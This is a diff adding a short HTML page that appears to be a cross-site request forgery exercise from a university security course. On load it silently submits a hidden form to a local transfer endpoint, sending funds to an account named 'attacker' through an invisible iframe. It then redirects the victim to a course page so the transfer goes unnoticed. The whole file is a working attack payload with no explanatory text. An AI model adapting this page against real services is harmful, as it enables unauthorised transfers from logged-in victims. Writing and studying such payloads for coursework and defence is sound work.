@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<body onload="document.transfer_form.submit()">
+    <form target="transfer_frame" name="transfer_form" action="http://localhost:3000/post_transfer" method="post">
+        <input style="display:none;"  type="text" name="destination_username" value="attacker">
+        <input style="display:none;"  type="text" name="quantity" value="10">
+    </form>
+    <iframe style="display:none;" name="transfer_frame" onload="iframe_loaded()"></iframe>
+    
+    <script>
+        var load_count = 0;
+        function iframe_loaded() {
+            load_count++;
+            if (load_count == 2) {
+               window.location.href="https://sharif.edu/~kharrazi/courses/40441-011/";
+            }
+        }
+    </script>
+</body>
+</html>
